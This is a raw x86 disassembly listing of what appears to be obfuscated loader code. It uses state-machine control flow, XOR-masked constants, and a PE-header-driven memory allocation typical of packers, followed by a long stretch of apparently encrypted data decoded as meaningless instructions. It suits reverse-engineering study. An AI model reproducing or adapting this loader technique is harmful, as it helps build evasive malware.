  415113:	mov    DWORD PTR [ebp-0x30],0xf89c85b2
  41511a:	mov    DWORD PTR [ebp-0x34],0xf89c85b3
  415121:	mov    DWORD PTR [ebp-0x38],0xf89c85b0
  415128:	lea    ecx,[ebp-0x2c]
  41512b:	mov    DWORD PTR [ebp-0xc],ecx
  41512e:	lea    ecx,[ebp-0x30]
  415131:	mov    DWORD PTR [ebp-0x10],ecx
  415134:	lea    ecx,[ebp-0x34]
  415137:	mov    DWORD PTR [ebp+0xc],ecx
  41513a:	lea    ecx,[ebp-0x38]
  41513d:	mov    DWORD PTR [ebp-0x14],ecx
  415140:	mov    ecx,DWORD PTR [ebp+0x8]
  415143:	xor    ecx,edi
  415145:	add    ecx,ebx
  415147:	mov    DWORD PTR [ebp-0x18],ecx
  41514a:	jmp    0x415346
  41514f:	cmp    eax,0xf89c85b3
  415154:	je     0x415358
  41515a:	mov    ecx,DWORD PTR [ebp-0x8]
  41515d:	xor    ecx,edi
  41515f:	mov    esi,eax
  415161:	add    ecx,ebx
  415163:	mov    DWORD PTR [ebp+0x18],ecx
  415166:	mov    eax,DWORD PTR [ebp-0x18]
  415169:	xor    esi,edi
  41516b:	lea    eax,[eax+esi*1+0x3272dd]
  415172:	mov    DWORD PTR [ebp-0x18],eax
  415175:	mov    eax,DWORD PTR [ebp-0x8]
  415178:	mov    ecx,DWORD PTR [ebp-0x18]
  41517b:	xor    eax,edi
  41517d:	add    eax,ebx
  41517f:	cmp    ecx,eax
  415181:	jne    0x415196
  415183:	mov    eax,DWORD PTR [ebp+0x8]
  415186:	xor    eax,edi
  415188:	add    eax,ebx
  41518a:	push   eax
  41518b:	push   0xc
  41518d:	lea    eax,[ebp-0x4c]
  415190:	push   eax
  415191:	call   0x414b97
  415196:	mov    eax,DWORD PTR [ebp-0xc]
  415199:	mov    eax,DWORD PTR [eax]
  41519b:	xor    eax,edi
  41519d:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151a7:	xor    ecx,edi
  4151a9:	movzx  eax,al
  4151ac:	add    ecx,ebx
  4151ae:	cmp    eax,ecx
  4151b0:	je     0x41532e
  4151b6:	mov    eax,DWORD PTR [ebp-0x10]
  4151b9:	mov    eax,DWORD PTR [eax]
  4151bb:	xor    eax,edi
  4151bd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151c7:	xor    ecx,edi
  4151c9:	movzx  eax,al
  4151cc:	add    ecx,ebx
  4151ce:	cmp    eax,ecx
  4151d0:	je     0x41532e
  4151d6:	mov    eax,DWORD PTR [ebp+0xc]
  4151d9:	mov    eax,DWORD PTR [eax]
  4151db:	xor    eax,edi
  4151dd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4151e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4151e7:	xor    ecx,edi
  4151e9:	movzx  eax,al
  4151ec:	add    ecx,ebx
  4151ee:	cmp    eax,ecx
  4151f0:	je     0x41532e
  4151f6:	mov    eax,DWORD PTR [ebp-0x14]
  4151f9:	mov    eax,DWORD PTR [eax]
  4151fb:	xor    eax,edi
  4151fd:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415204:	mov    ecx,DWORD PTR [ebp+0x8]
  415207:	xor    ecx,edi
  415209:	movzx  eax,al
  41520c:	add    ecx,ebx
  41520e:	cmp    eax,ecx
  415210:	je     0x41532e
  415216:	mov    eax,DWORD PTR [ebp-0x10]
  415219:	mov    eax,DWORD PTR [eax]
  41521b:	xor    eax,edi
  41521d:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415224:	mov    ecx,DWORD PTR [ebp-0xc]
  415227:	mov    ecx,DWORD PTR [ecx]
  415229:	xor    ecx,edi
  41522b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415232:	xor    al,cl
  415234:	mov    ecx,DWORD PTR [ebp+0xc]
  415237:	mov    ecx,DWORD PTR [ecx]
  415239:	xor    ecx,edi
  41523b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415242:	or     al,cl
  415244:	mov    ecx,DWORD PTR [ebp-0xc]
  415247:	mov    ecx,DWORD PTR [ecx]
  415249:	xor    ecx,edi
  41524b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  415252:	cmp    cl,al
  415254:	jne    0x41532e
  41525a:	mov    eax,DWORD PTR [ebp+0xc]
  41525d:	mov    eax,DWORD PTR [eax]
  41525f:	xor    eax,edi
  415261:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  415268:	mov    ecx,DWORD PTR [ebp-0x10]
  41526b:	mov    ecx,DWORD PTR [ecx]
  41526d:	xor    ecx,edi
  41526f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415276:	xor    al,cl
  415278:	mov    ecx,DWORD PTR [ebp-0x14]
  41527b:	mov    ecx,DWORD PTR [ecx]
  41527d:	xor    ecx,edi
  41527f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  415286:	or     al,cl
  415288:	mov    ecx,DWORD PTR [ebp-0x10]
  41528b:	mov    ecx,DWORD PTR [ecx]
  41528d:	xor    ecx,edi
  41528f:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  415296:	cmp    cl,al
  415298:	jne    0x41532e
  41529e:	mov    eax,DWORD PTR [ebp-0x14]
  4152a1:	mov    eax,DWORD PTR [eax]
  4152a3:	xor    eax,edi
  4152a5:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4152ac:	mov    ecx,DWORD PTR [ebp+0xc]
  4152af:	mov    ecx,DWORD PTR [ecx]
  4152b1:	xor    ecx,edi
  4152b3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152ba:	xor    al,cl
  4152bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4152bf:	mov    ecx,DWORD PTR [ecx]
  4152c1:	xor    ecx,edi
  4152c3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152ca:	or     al,cl
  4152cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4152cf:	mov    ecx,DWORD PTR [ecx]
  4152d1:	xor    ecx,edi
  4152d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  4152da:	cmp    cl,al
  4152dc:	jne    0x41532e
  4152de:	mov    eax,DWORD PTR [ebp-0x14]
  4152e1:	mov    eax,DWORD PTR [eax]
  4152e3:	xor    eax,edi
  4152e5:	mov    al,BYTE PTR [ebp+eax*1+0x327291]
  4152ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4152ef:	mov    ecx,DWORD PTR [ecx]
  4152f1:	xor    ecx,edi
  4152f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  4152fa:	xor    al,cl
  4152fc:	mov    ecx,DWORD PTR [ebp-0x10]
  4152ff:	mov    ecx,DWORD PTR [ecx]
  415301:	xor    ecx,edi
  415303:	mov    cl,BYTE PTR [ebp+ecx*1+0x327291]
  41530a:	or     al,cl
  41530c:	mov    ecx,DWORD PTR [ebp-0x14]
  41530f:	mov    ecx,DWORD PTR [ecx]
  415311:	xor    ecx,edi
  415313:	mov    cl,BYTE PTR [ebp+ecx*1+0x327295]
  41531a:	cmp    cl,al
  41531c:	jne    0x41532e
  41531e:	lea    eax,[ebp-0x4c]
  415321:	push   eax
  415322:	call   0x414de8
  415327:	mov    ecx,DWORD PTR [ebp-0x44]
  41532a:	cmp    eax,ecx
  41532c:	je     0x415338
  41532e:	mov    eax,DWORD PTR [ebp+0x8]
  415331:	xor    eax,edi
  415333:	add    eax,ebx
  415335:	mov    DWORD PTR [ebp+0x18],eax
  415338:	mov    eax,DWORD PTR [ebp-0x8]
  41533b:	xor    eax,edi
  41533d:	lea    eax,[eax+esi*1+0x3272dd]
  415344:	xor    eax,edi
  415346:	mov    ecx,DWORD PTR [ebp+0x8]
  415349:	mov    edx,DWORD PTR [ebp+0x18]
  41534c:	xor    ecx,edi
  41534e:	add    ecx,ebx
  415350:	cmp    edx,ecx
  415352:	je     0x41514f
  415358:	mov    eax,DWORD PTR [ebp+0x8]
  41535b:	mov    ecx,DWORD PTR [ebp+0x18]
  41535e:	xor    eax,edi
  415360:	add    eax,ebx
  415362:	cmp    ecx,eax
  415364:	jne    0x415377
  415366:	mov    eax,DWORD PTR [ebp-0x8]
  415369:	mov    ecx,DWORD PTR [ebp+0x1c]
  41536c:	xor    eax,edi
  41536e:	lea    eax,[eax+ecx*1+0x3272dd]
  415375:	jmp    0x4153ee
  415377:	push   0x18
  415379:	push   DWORD PTR [ebp-0x4]
  41537c:	lea    eax,[ebp-0x64]
  41537f:	push   eax
  415380:	call   0x414620
  415385:	mov    eax,DWORD PTR [ebp+0x8]
  415388:	mov    ecx,DWORD PTR [ebp-0x18]
  41538b:	xor    eax,edi
  41538d:	add    eax,ebx
  41538f:	cmp    eax,ecx
  415391:	je     0x4153a6
  415393:	mov    eax,DWORD PTR [ebp+0x8]
  415396:	xor    eax,edi
  415398:	add    eax,ebx
  41539a:	push   eax
  41539b:	push   0x18
  41539d:	lea    eax,[ebp-0x64]
  4153a0:	push   eax
  4153a1:	call   0x414b97
  4153a6:	mov    eax,DWORD PTR [ebp-0x4]
  4153a9:	add    eax,0x18
  4153ac:	mov    DWORD PTR [ebp+0x18],eax
  4153af:	push   DWORD PTR [ebp-0x50]
  4153b2:	push   DWORD PTR [ebp+0x18]
  4153b5:	mov    eax,DWORD PTR [ebp-0x54]
  4153b8:	add    eax,DWORD PTR [ebp-0x20]
  4153bb:	push   eax
  4153bc:	call   0x414620
  4153c1:	mov    eax,DWORD PTR [ebp+0x8]
  4153c4:	mov    ecx,DWORD PTR [ebp-0x18]
  4153c7:	xor    eax,edi
  4153c9:	add    eax,ebx
  4153cb:	cmp    eax,ecx
  4153cd:	je     0x4153e0
  4153cf:	push   0x0
  4153d1:	push   DWORD PTR [ebp-0x50]
  4153d4:	mov    eax,DWORD PTR [ebp-0x54]
  4153d7:	add    eax,DWORD PTR [ebp-0x20]
  4153da:	push   eax
  4153db:	call   0x414b97
  4153e0:	mov    eax,DWORD PTR [ebp-0x24]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x50]
  4153e6:	add    DWORD PTR [eax],ecx
  4153e8:	mov    eax,DWORD PTR [ebp-0x50]
  4153eb:	add    eax,DWORD PTR [ebp+0x1c]
  4153ee:	mov    DWORD PTR [ebp+0x1c],eax
  4153f1:	mov    eax,DWORD PTR [ebp-0x8]
  4153f4:	mov    ecx,DWORD PTR [ebp+0x1c]
  4153f7:	xor    eax,edi
  4153f9:	add    eax,ebx
  4153fb:	imul   eax,ecx
  4153fe:	mov    ecx,DWORD PTR [ebp+0x8]
  415401:	mov    edx,DWORD PTR [ebp-0x28]
  415404:	xor    ecx,edi
  415406:	lea    ecx,[ecx+edx*1+0x3272dd]
  41540d:	cmp    eax,ecx
  41540f:	jb     0x41506c
  415415:	mov    esi,DWORD PTR [ebp+0x14]
  415418:	mov    eax,DWORD PTR [ebp-0x20]
  41541b:	mov    DWORD PTR [esi],eax
  41541d:	jmp    0x415464
  41541f:	mov    ecx,DWORD PTR [ebp+0x8]
  415422:	mov    edx,DWORD PTR [ebp+0xc]
  415425:	xor    ecx,edi
  415427:	xor    edx,edi
  415429:	add    ecx,ebx
  41542b:	add    edx,ebx
  41542d:	cmp    ecx,edx
  41542f:	jne    0x415443
  415431:	mov    eax,ds:0x7f642d1c
  415436:	imul   eax,eax,0x9f15fcef
  41543c:	mov    ds:0x7f642d1c,eax
  415441:	jmp    0x415464
  415443:	mov    ecx,DWORD PTR [ebp+0x8]
  415446:	xor    ecx,edi
  415448:	add    ecx,ebx
  41544a:	cmp    eax,ecx
  41544c:	je     0x41545a
  41544e:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  415458:	jmp    0x415464
  41545a:	and    DWORD PTR ds:0x3343fa1c,0x5265ec3f
  415464:	pop    edi
  415465:	pop    esi
  415466:	pop    ebx
  415467:	leave  
  415468:	ret    0x18
  41546b:	push   ebp
  41546c:	mov    ebp,esp
  41546e:	and    esp,0xfffffff8
  415471:	mov    eax,DWORD PTR [ebp+0x20]
  415474:	sub    esp,0x14
  415477:	push   ebx
  415478:	mov    ebx,DWORD PTR [ebp+0x14]
  41547b:	push   esi
  41547c:	push   edi
  41547d:	cmp    eax,0xf89c85b5
  415482:	jne    0x41548e
  415484:	push   0xf89c85b2
  415489:	jmp    0x4155c0
  41548e:	mov    eax,DWORD PTR [ebp+0x20]
  415491:	cmp    eax,0xf89c85b2
  415496:	jne    0x4154a2
  415498:	push   0xf89c85b3
  41549d:	jmp    0x4155c0
  4154a2:	mov    eax,DWORD PTR [ebp+0x20]
  4154a5:	cmp    eax,0xf89c85b3
  4154aa:	jne    0x4154b6
  4154ac:	push   0xf89c85b0
  4154b1:	jmp    0x4155c0
  4154b6:	mov    eax,DWORD PTR [ebp+0x20]
  4154b9:	cmp    eax,0xf89c85b0
  4154be:	jne    0x4154ca
  4154c0:	push   0xf89c85b1
  4154c5:	jmp    0x4155c0
  4154ca:	mov    ecx,DWORD PTR [ebp+0x20]
  4154cd:	mov    eax,0xf89c85bc
  4154d2:	cmp    ecx,eax
  4154d4:	jne    0x415590
  4154da:	mov    eax,DWORD PTR [ebp+0x10]
  4154dd:	mov    DWORD PTR [esp+0xc],eax
  4154e1:	mov    eax,DWORD PTR [ebp+0x18]
  4154e4:	mov    DWORD PTR [esp+0x14],eax
  4154e8:	mov    eax,DWORD PTR [ebp+0xc]
  4154eb:	mov    DWORD PTR [esp+0x18],eax
  4154ef:	mov    eax,DWORD PTR [ebp+0x8]
  4154f2:	mov    DWORD PTR [esp+0x10],eax
  4154f6:	mov    eax,DWORD PTR [esp+0x10]
  4154fa:	mov    ecx,DWORD PTR [esp+0x14]
  4154fe:	mov    edi,0x7510896
  415503:	xor    eax,edi
  415505:	mov    esi,0x3272dd
  41550a:	add    eax,esi
  41550c:	mov    DWORD PTR [ecx],eax
  41550e:	mov    eax,DWORD PTR [esp+0xc]
  415512:	mov    eax,DWORD PTR [eax+0x194]
  415518:	mov    ecx,DWORD PTR [eax]
  41551a:	mov    eax,DWORD PTR [esp+0xc]
  41551e:	mov    eax,DWORD PTR [eax+0x194]
  415524:	mov    eax,DWORD PTR [eax]
  415526:	add    eax,DWORD PTR [ecx+0x3c]
  415529:	mov    ecx,DWORD PTR [esp+0xc]
  41552d:	mov    ecx,DWORD PTR [ecx+0x1d8]
  415533:	mov    ecx,DWORD PTR [ecx+0x14]
  415536:	push   0x4
  415538:	push   0x3000
  41553d:	push   DWORD PTR [eax+0x50]
  415540:	push   0x0
  415542:	call   ecx
  415544:	mov    DWORD PTR [ebx],eax
  415546:	mov    eax,DWORD PTR [esp+0x10]
  41554a:	push   DWORD PTR [esp+0xc]
  41554e:	xor    eax,edi
  415550:	add    eax,esi
  415552:	mov    DWORD PTR [esp+0x20],eax
  415556:	lea    eax,[esp+0x20]
  41555a:	push   eax
  41555b:	push   ebx
  41555c:	push   DWORD PTR [esp+0x20]
  415560:	push   DWORD PTR [esp+0x28]
  415564:	push   DWORD PTR [esp+0x24]
  415568:	call   0x414f2c
  41556d:	mov    eax,DWORD PTR [esp+0x10]
  415571:	mov    ecx,DWORD PTR [ebx]
  415573:	xor    eax,edi
  415575:	add    eax,esi
  415577:	cmp    ecx,eax
  415579:	je     0x4155d7
  41557b:	mov    eax,DWORD PTR [esp+0x18]
  41557f:	mov    ecx,DWORD PTR [esp+0x14]
  415583:	xor    eax,edi
  415585:	add    eax,esi
  415587:	imul   eax,DWORD PTR [esp+0x1c]
  41558c:	mov    DWORD PTR [ecx],eax
  41558e:	jmp    0x4155d7
  415590:	mov    ecx,DWORD PTR [ebp+0x20]
  415593:	cmp    ecx,0xf89c85b1
  415599:	jne    0x4155a2
  41559b:	push   0xf89c85be
  4155a0:	jmp    0x4155c0
  4155a2:	mov    ecx,DWORD PTR [ebp+0x20]
  4155a5:	cmp    ecx,0xf89c85be
  4155ab:	jne    0x4155b4
  4155ad:	push   0xf89c85bf
  4155b2:	jmp    0x4155c0
  4155b4:	mov    ecx,DWORD PTR [ebp+0x20]
  4155b7:	cmp    ecx,0xf89c85bf
  4155bd:	jne    0x4155d7
  4155bf:	push   eax
  4155c0:	push   DWORD PTR [ebp+0x1c]
  4155c3:	push   DWORD PTR [ebp+0x18]
  4155c6:	push   ebx
  4155c7:	push   DWORD PTR [ebp+0x10]
  4155ca:	push   DWORD PTR [ebp+0xc]
  4155cd:	push   DWORD PTR [ebp+0x8]
  4155d0:	call   0x41546b
  4155d5:	mov    DWORD PTR [ebx],eax
  4155d7:	mov    eax,DWORD PTR [ebx]
  4155d9:	pop    edi
  4155da:	pop    esi
  4155db:	pop    ebx
  4155dc:	mov    esp,ebp
  4155de:	pop    ebp
  4155df:	ret    0x1c
  4155e2:	push   ebp
  4155e3:	mov    ebp,esp
  4155e5:	sub    esp,0xc
  4155e8:	mov    eax,0xf89c85b5
  4155ed:	mov    DWORD PTR [ebp-0x8],eax
  4155f0:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  4155f7:	mov    ecx,DWORD PTR [ebp-0x8]
  4155fa:	xor    ecx,0x7510896
  415600:	add    ecx,0x3272dd
  415606:	mov    DWORD PTR [ebp-0x4],ecx
  415609:	mov    ecx,DWORD PTR [ebp+0xc]
  41560c:	push   eax
  41560d:	mov    DWORD PTR [ebp+0xc],ecx
  415610:	push   DWORD PTR [ebp+0xc]
  415613:	lea    eax,[ebp-0x4]
  415616:	push   DWORD PTR [ebp+0x8]
  415619:	push   eax
  41561a:	push   DWORD PTR [ebp+0xc]
  41561d:	push   DWORD PTR [ebp-0xc]
  415620:	push   DWORD PTR [ebp-0x8]
  415623:	call   0x41546b
  415628:	mov    DWORD PTR [ebp-0x4],eax
  41562b:	mov    eax,DWORD PTR [ebp-0x4]
  41562e:	leave  
  41562f:	ret    0x8
  415632:	mov    cl,0x27
  415634:	popa   
  415635:	test   bh,dh
  415637:	(bad)  
  415638:	cmc    
  415639:	aaa    
  41563a:	push   ss
  41563b:	shr    BYTE PTR [edi],0x1f
  41563e:	or     ah,cl
  415640:	pop    ds
  415641:	aas    
  415642:	jns    0x415618
  415644:	add    BYTE PTR [eax],al
  415646:	repz add al,0x0
  415649:	add    BYTE PTR [edx+0x3f09a155],al
  41564f:	je     0x4156a3
  415651:	add    ebx,DWORD PTR [eax+0x65]
  415654:	mov    edx,0xbad2a124
  415659:	ret    
  41565a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41565b:	into   
  41565c:	fcomp  QWORD PTR [eax+0x15df78d2]
  415662:	cmp    BYTE PTR [edi],bh
  415664:	adc    eax,0x6a936484
  415669:	xchg   DWORD PTR fs:[edx+esi*1-0x129094bc],ebp
  415671:	pop    ds
  415672:	fcmovne st,st(2)
  415674:	ja     0x415643
  415676:	mov    al,ds:0x48f3836d
  41567b:	and    al,0xc6
  41567d:	adc    bl,al
  41567f:	push   ss
  415680:	sub    eax,0x6db53df2
  415685:	lds    eax,FWORD PTR [eax-0x5f968c3c]
  41568b:	mov    ah,0xb5
  41568d:	xchg   edi,eax
  41568e:	or     ebp,DWORD PTR [edx+0x0]
  415691:	mov    dl,0xd0
  415693:	mov    esp,0xbb887234
  415698:	push   ecx
  415699:	jg     0x415703
  41569b:	popa   
  41569c:	mov    DWORD PTR ds:[ebx],esp
  41569f:	xchg   esp,eax
  4156a0:	fild   QWORD PTR [esi+ecx*2+0x68]
  4156a4:	fst    DWORD PTR [eax+0x76f5c11b]
  4156aa:	stos   DWORD PTR es:[edi],eax
  4156ab:	sbb    eax,0xf56144f9
  4156b0:	and    eax,0xf2e31dd7
  4156b5:	sbb    DWORD PTR [eax+0x19d27139],0x25
  4156bc:	(bad)
  4156bf:	dec    ecx
  4156c0:	std    
  4156c1:	mov    cl,BYTE PTR [ecx-0x67]
  4156c4:	not    BYTE PTR [eax-0x5d8e3d7f]
  4156ca:	sbb    al,0x96
  4156cc:	sbb    ebp,0x2248e62c
  4156d2:	mov    dl,0xc6
  4156d4:	dec    edx
  4156d5:	ss mov eax,0xfe0e3227
  4156db:	ret    0x51fe
  4156de:	fmul   QWORD PTR [esi+eiz*2]
  4156e1:	cmp    BYTE PTR [eax],ah
  4156e3:	not    BYTE PTR [esi-0x38]
  4156e6:	pop    esi
  4156e7:	sahf   
  4156e8:	sbb    bh,bh
  4156ea:	lods   al,BYTE PTR ds:[esi]
  4156eb:	popf   
  4156ec:	xchg   esi,eax
  4156ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156ee:	jns    0x4156d4
  4156f0:	push   0x17
  4156f2:	ret    0x6f3a
  4156f5:	lods   al,BYTE PTR ds:[esi]
  4156f6:	loop   0x415693
  4156f8:	pop    ss
  4156f9:	rol    bl,cl
  4156fb:	push   ss
  4156fc:	mov    esp,0x32b64f81
  415701:	push   ds
  415702:	sub    BYTE PTR [ebx],cl
  415704:	data16 daa 
  415706:	push   ebx
  415707:	add    sp,WORD PTR [ecx]
  41570a:	test   BYTE PTR [ebx+0x22],dl
  41570d:	and    BYTE PTR [ebp-0x54f8c230],dl
  415713:	retf   0xbb33
  415716:	pop    edi
  415717:	int    0xf1
  415719:	sbb    edi,DWORD PTR [ecx]
  41571b:	or     dl,BYTE PTR [eax+0x49]
  41571e:	pop    ebp
  41571f:	(bad)
  415723:	push   ds
  415724:	lahf   
  415725:	(bad)  
  415726:	jmp    0xde84:0xfb09c3e3
  41572d:	aad    0x96
  41572f:	imul   ebp,ebx,0x7716a811
  415735:	sbb    eax,0x4cb3f239
  41573a:	enter  0xfa43,0x77
  41573e:	cmp    eax,0xf08735ad
  415743:	das    
  415744:	adc    DWORD PTR [esi+0x2e],esp
  415747:	ins    DWORD PTR es:[edi],dx
  415748:	ror    BYTE PTR [edx-0x5934ba91],cl
  41574e:	cdq    
  41574f:	push   es
  415750:	mov    edx,0x12ab7023
  415755:	and    bh,BYTE PTR [esi+0x461ffc6]
  41575b:	add    edi,edi
  41575d:	jmp    0x415797
  41575f:	sub    al,0x3e
  415761:	enter  0xd0fd,0xae
  415765:	test   DWORD PTR es:[edi+esi*1+0x3c0e8497],esi
  41576d:	jl     0x415782
  41576f:	add    al,0x3b
  415771:	jno    0x4157b6
  415773:	daa    
  415774:	fnstcw WORD PTR [edx+0x39]
  415777:	mov    ebx,0x3a127aa9
  41577c:	mov    esp,0x25ac97f7
  415781:	xor    bh,BYTE PTR [esi]
  415783:	xor    eax,0xa491450
  415788:	mov    bl,0x65
  41578a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41578b:	jns    0x415758
  41578d:	les    edi,FWORD PTR [eax]
  41578f:	enter  0x99ac,0x43
  415793:	sbb    esi,DWORD PTR [ecx+ebx*8]
  415796:	adc    DWORD PTR [ebp+0x63e17be3],ecx
  41579c:	fwait
  41579d:	scas   eax,DWORD PTR es:[edi]
  41579e:	mov    bh,0x58
  4157a0:	pop    edi
  4157a1:	push   es
  4157a2:	cmp    BYTE PTR [edi+0x4d],ch
  4157a5:	mov    ah,0xbf
  4157a7:	in     al,0xbb
  4157a9:	and    al,0xfd
  4157ab:	or     esp,ebx
  4157ad:	call   0x29ffd2a2
  4157b2:	adc    DWORD PTR fs:[eax-0x7a],edi
  4157b6:	adc    edi,0x769b4131
  4157bc:	mov    edi,0xae6e27c3
  4157c1:	inc    edx
  4157c2:	fmul   DWORD PTR [edx+0x48]
  4157c5:	mov    DWORD PTR [edi+edx*1+0x75],esp
  4157c9:	std    
  4157ca:	pop    edx
  4157cb:	xor    bl,ch
  4157cd:	push   0xffffff94
  4157cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157d0:	push   0xfffffff6
  4157d2:	(bad)  
  4157d3:	adc    eax,0x15e65b6e
  4157d8:	xchg   ebx,eax
  4157d9:	mov    ebx,0xced3bd6f
  4157de:	add    DWORD PTR [ebp+0x29],edi
  4157e1:	and    eax,ebx
  4157e3:	in     al,dx
  4157e4:	and    al,0xb6
  4157e6:	scas   eax,DWORD PTR es:[edi]
  4157e7:	mov    ah,0x29
  4157e9:	jmp    0x2ede80ef
  4157ee:	xchg   ebp,eax
  4157ef:	adc    cl,BYTE PTR [ebp-0x54f8d718]
  4157f5:	das    
  4157f6:	jae    0x415871
  4157f8:	mov    es,WORD PTR [ebx]
  4157fa:	call   0xd16f:0x250b0428
  415801:	int3   
  415802:	test   DWORD PTR [eax-0x2d4cb546],ebp
  415808:	cmc    
  415809:	mov    edx,0xc74f16c1
  41580e:	pop    es
  41580f:	or     BYTE PTR [edx],dl
  415811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415812:	mov    WORD PTR [ebx],fs
  415814:	in     al,0x21
  415816:	add    BYTE PTR [ecx-0x623174],bh
  41581c:	push   esi
  41581d:	lods   eax,DWORD PTR ds:[esi]
  41581e:	add    eax,0xbbefe850
  415823:	xchg   edi,eax
  415824:	xchg   ebx,eax
  415825:	repz xchg ebp,eax
  415827:	lahf   
  415828:	inc    ebx
  415829:	cmp    esp,DWORD PTR [esi+0x15]
  41582c:	adc    BYTE PTR [esp+edi*2],0x6e
  415830:	clc    
  415831:	push   edx
  415832:	outs   dx,DWORD PTR ds:[esi]
  415833:	xchg   esi,eax
  415834:	aas    
  415835:	push   0x50
  415837:	mov    cl,0xbb
  415839:	mov    esp,0xb16a2b49
  41583e:	ret    
  41583f:	loopne 0x41581c
  415841:	popf   
  415842:	mov    cl,0xff
  415844:	gs sbb ch,0x2e
  415848:	sub    al,0xd3
  41584a:	mov    BYTE PTR [ecx-0x74],al
  41584d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41584e:	cli    
  41584f:	cwde   
  415850:	xchg   esp,eax
  415851:	pop    ds
  415852:	je     0x415843
  415854:	test   eax,0x778d9c31
  415859:	int    0x8f
  41585b:	push   es
  41585c:	mov    cl,0xad
  41585e:	inc    dx
  415860:	inc    esp
  415861:	retf   
  415862:	pop    ecx
  415863:	outs   dx,BYTE PTR ds:[esi]
  415864:	sbb    esp,DWORD PTR [edi+0x305745e1]
  41586a:	adc    al,0xe0
  41586c:	stc    
  41586d:	dec    ebx
  41586e:	lea    edx,[esi]
  415870:	mov    bl,0x20
  415872:	test   BYTE PTR [eax-0x6e],cl
  415875:	pop    esp
  415876:	fmul   QWORD PTR [edi-0x2385e51c]
  41587c:	loopne 0x415885
  41587e:	loop   0x415821
  415880:	and    ah,ch
  415882:	mov    ah,0x2b
  415884:	ins    BYTE PTR es:[edi],dx
  415885:	add    ebp,esp
  415887:	push   edx
  415888:	repnz aas 
  41588a:	inc    ecx
  41588b:	call   0x413a:0xfef9c3a5
  415892:	mov    al,0x9a
  415894:	outs   dx,BYTE PTR cs:[esi]
  415896:	cmp    ebp,DWORD PTR [ebx-0x6fbc4fd7]
  41589c:	sub    al,0x8a
  41589e:	test   eax,0xdcf1bff
  4158a3:	add    al,0xd9
  4158a5:	loopne 0x415905
  4158a7:	mov    dl,0x48
  4158a9:	xchg   eax,ebx
  4158ab:	data16 in al,dx
  4158ad:	mov    ah,0xc5
  4158af:	mov    esi,0xc61f87c7
  4158b4:	add    BYTE PTR [edi],ch
  4158b6:	adc    BYTE PTR [ecx-0x1d],dh
  4158b9:	f2xm1  
  4158bb:	ret    0x8032
  4158be:	scas   al,BYTE PTR es:[edi]
  4158bf:	lods   al,BYTE PTR ds:[esi]
  4158c0:	aam    0xd
  4158c2:	cmp    al,bh
  4158c4:	and    dl,cl
  4158c6:	jo     0x415910
  4158c8:	sbb    BYTE PTR [ebp+0x1960bca5],0xda
  4158cf:	nop
  4158d0:	jl     0x4158b4
  4158d2:	xor    ecx,DWORD PTR [edx+0x432d0602]
  4158d8:	mov    cs:0xb7f9c0d0,al
  4158de:	in     eax,0xdb
  4158e0:	lahf   
  4158e1:	test   eax,0x2f22cc88
  4158e6:	mov    bh,ah
  4158e8:	jle    0x4158cc
  4158ea:	jo     0x4158b1
  4158ec:	inc    ebp
  4158ed:	sub    edi,DWORD PTR [edi]
  4158ef:	jno    0x41596c
  4158f1:	jo     0x415959
  4158f3:	sbb    al,0x8a
  4158f5:	jns    0x415953
  4158f7:	sub    al,0x95
  4158fa:	inc    BYTE PTR [ebx-0x384ec624]
  415900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415901:	out    0xb1,eax
  415903:	lahf   
  415904:	shl    dl,cl
  415906:	adc    al,0xb0
  415908:	adc    al,0x81
  41590a:	mov    esp,0xe6f55e92
  41590f:	ss xor eax,0x91586646
  415915:	pop    eax
  415916:	in     eax,0x7a
  415918:	adc    BYTE PTR [edx],ah
  41591a:	add    BYTE PTR [esi-0x21f68989],0x13
  415921:	inc    eax
  415922:	pop    edi
  415923:	pop    edi
  415924:	int    0xfc
  415926:	nop
  415927:	dec    ebp
  415928:	ins    BYTE PTR es:[edi],dx
  415929:	jb     0x415961
  41592b:	lods   al,BYTE PTR ds:[esi]
  41592c:	out    dx,eax
  41592d:	push   ebx
  41592e:	neg    DWORD PTR [eax+0x7b]
  415931:	pop    esp
  415932:	ret    
  415933:	popa   
  415934:	push   0x38
  415936:	inc    esp
  415937:	push   esp
  415938:	mov    ah,0x5f
  41593a:	test   eax,0xdae9b004
  41593f:	jmp    0x3883:0xb12e8447
  415946:	cmp    ch,cl
  415948:	jmp    0x415919
  41594a:	in     al,0x85
  41594c:	rcr    DWORD PTR [edx],cl
  41594e:	pop    esi
  41594f:	clc    
  415950:	out    dx,eax
  415951:	loop   0x415967
  415953:	cld    
  415954:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
